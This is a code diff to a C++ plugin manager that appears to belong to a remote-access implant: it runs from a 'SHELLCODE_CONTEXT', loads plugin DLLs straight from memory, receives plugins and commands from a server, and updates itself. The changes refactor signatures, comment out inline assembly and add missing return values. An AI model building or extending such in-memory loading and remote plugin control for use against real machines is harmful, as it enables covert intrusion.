@@ -5,11 +5,11 @@
 
 FARPROC WINAPI GPA_WRAPPER(HMODULE hModule, LPCTSTR lpProcName);
 
-bool WINAPI LoadLibraryFromMemory(PLoadLibraryFromMemory loadLib,SHELLCODE_CONTEXT* pSCC,
+bool WINAPI LoadLibraryFromMemory(SHELLCODE_CONTEXT* pSCC,
                                    const void *data, LPCWSTR dllname, PMEMORYMODULE result);
-void WINAPI FreeLibraryFromMemory(PFreeLibraryFromMemory freeLib,SHELLCODE_CONTEXT* pSCC, PMEMORYMODULE module);
+void WINAPI FreeLibraryFromMemory(SHELLCODE_CONTEXT* pSCC, PMEMORYMODULE module);
 
-int __cdecl printf(const char*, ...);
+//int __cdecl printf(const char*, ...);
 
 class pluginEvent{
         PluginManager* PluginMgr;
@@ -39,8 +39,7 @@ PluginManager::~PluginManager(){
         DebufPrintf("unloading plugin\n");
         //__asm__("int3");
         delete pluginList->p->plugInterface;
-        ::FreeLibraryFromMemory(Context->FreeLibraryFromMemory,
-                                Context,&pluginList->getPlugInformation()->Module);
+        ::FreeLibraryFromMemory(Context,&pluginList->getPlugInformation()->Module);
     }
 }
 
@@ -56,7 +55,7 @@ uint PluginManager::run(SHELLCODE_CONTEXT* Context){
     return client.serverLoop();
 }
 
-bool PluginManager::updateServer(DArray& newServer){
+bool PluginManager::updateServer(DArray& /*newServer*/){
     char FileName[1024];
     char FileNameNew[1024];
     long FilenameSize;
@@ -73,11 +72,12 @@ bool PluginManager::updateServer(DArray& newServer){
 int exception(){
     return EXCEPTION_CONTINUE_SEARCH;
 }
-bool WINAPI LoadLibraryFromMemory(PLoadLibraryFromMemory loadLib,SHELLCODE_CONTEXT* pSCC,
+bool WINAPI LoadLibraryFromMemory(SHELLCODE_CONTEXT* pSCC,
                                    const void *data, LPCWSTR dllname, PMEMORYMODULE result){
     int status = 0;
+    status = pSCC->LoadLibraryFromMemory(pSCC,data,dllname,result);
     //DebufPrintf("LoadLibraryFromMemory\n");
-
+/*
     __asm__ __volatile__(
         "push %ebx;push %edx;push %ecx;push %esi;push %edi;"
     );
@@ -95,14 +95,15 @@ bool WINAPI LoadLibraryFromMemory(PLoadLibraryFromMemory loadLib,SHELLCODE_CONTE
     );
     __asm__ __volatile__(
         "pop %edi;pop %esi;pop %ecx;pop %edx;pop %ebx;"
-    );
+    );*/
 
-    return status;
+    return status!=0;
 }
 
-void WINAPI FreeLibraryFromMemory(PFreeLibraryFromMemory freeLib,SHELLCODE_CONTEXT* pSCC, PMEMORYMODULE module){
+void WINAPI FreeLibraryFromMemory(SHELLCODE_CONTEXT* pSCC, PMEMORYMODULE module){
     //DebufPrintf("LoadLibraryFromMemory\n");
-
+    pSCC->FreeLibraryFromMemory(pSCC,module);
+    /*
     __asm__ __volatile__(
         "push %eax;push %ebx;push %edx;push %ecx;push %esi;push %edi;"
     );
@@ -116,7 +117,7 @@ void WINAPI FreeLibraryFromMemory(PFreeLibraryFromMemory freeLib,SHELLCODE_CONTE
     );
     __asm__ __volatile__(
         "pop %edi;pop %esi;pop %ecx;pop %edx;pop %ebx;pop %eax"
-    );
+    );*/
 }
 
 bool PluginManager::loadPlugin(RPEP_LOAD_PLUGIN* pluginModule){
@@ -128,13 +129,13 @@ bool PluginManager::loadPlugin(RPEP_LOAD_PLUGIN* pluginModule){
     PluginManagerInterfacePrivate* pluginPrivate;
     bool result = false;
 
-    if(!isPluginLoad(pluginModule->PluginID)){
+    if(!isPluginLoad((ushort)pluginModule->PluginID)){
         DebufPrintf("Cargando plugin....\n");
         newPlugin = new plugin();
         DebufPrintf("newPlugin addr %x\n",(uint)newPlugin);
         //Cargamos el plugin
         {
-            loadResult = ::LoadLibraryFromMemory(Context->LoadLibraryFromMemory,Context,pluginModule->PluginModule,L"",&newPlugin->Module);
+            loadResult = ::LoadLibraryFromMemory(Context,pluginModule->PluginModule,L"",&newPlugin->Module);
         }
         if(loadResult){
             DebufPrintf("modulo cargado con exito\n");
@@ -152,7 +153,7 @@ bool PluginManager::loadPlugin(RPEP_LOAD_PLUGIN* pluginModule){
                     uint error = (uint)GetLastError();
                     DebufPrintf("GetProcAddress error: %x(%s)\n",error,
                            error==ERROR_PROC_NOT_FOUND?"PROC_NOT_FOUND":"");
-                    FreeLibraryFromMemory(Context->FreeLibraryFromMemory,Context,&newPlugin->Module);
+                    FreeLibraryFromMemory(Context,&newPlugin->Module);
                 }
                 delete newPlugin;
             }
@@ -163,7 +164,7 @@ bool PluginManager::loadPlugin(RPEP_LOAD_PLUGIN* pluginModule){
     return result;
 }
 
-plugin* PluginManager::getPluginById(ulong id){
+plugin* PluginManager::getPluginById(ulong /*id*/){
     return pluginList->getPlugInformation();
 }
 
@@ -195,17 +196,19 @@ int PluginManagerInterfacePrivate::sendData(const char *data, uint size){
     if(data){
         DArray buff;
 
-        this->mgr->getProtocol()->MakePacket(buff,this->p->ID,data,size);
+        this->mgr->getProtocol()->MakePacket(buff,(ushort)this->p->ID,data,size);
         return this->mgr->getProtocol()->send(buff.data,buff.size);
     }
     return 0;
 }
 
-int PluginManagerInterfacePrivate::setErrorCode(uint code){
+int PluginManagerInterfacePrivate::setErrorCode(uint /*code*/){
+    return -1;
 }
 
 
 bool PluginManager::runPluginCMD(ulong pluginID, char *data, uint size){
+    bool result = false;
     DebufPrintf("[pm] runPluginCMD \n");
     plugin* currentPlugin;
     if((currentPlugin = getPluginById(pluginID))){
@@ -215,7 +218,9 @@ bool PluginManager::runPluginCMD(ulong pluginID, char *data, uint size){
          DebufPrintf("onReciveData size %x cadena %s\n",(uint)size,(char*)buff);*/
 
          currentPlugin->plugInterface->onReciveData(data,size);
+         result = true;
     }
+    return result;
 }
 
 #define FNV_PRIME_32 16777619
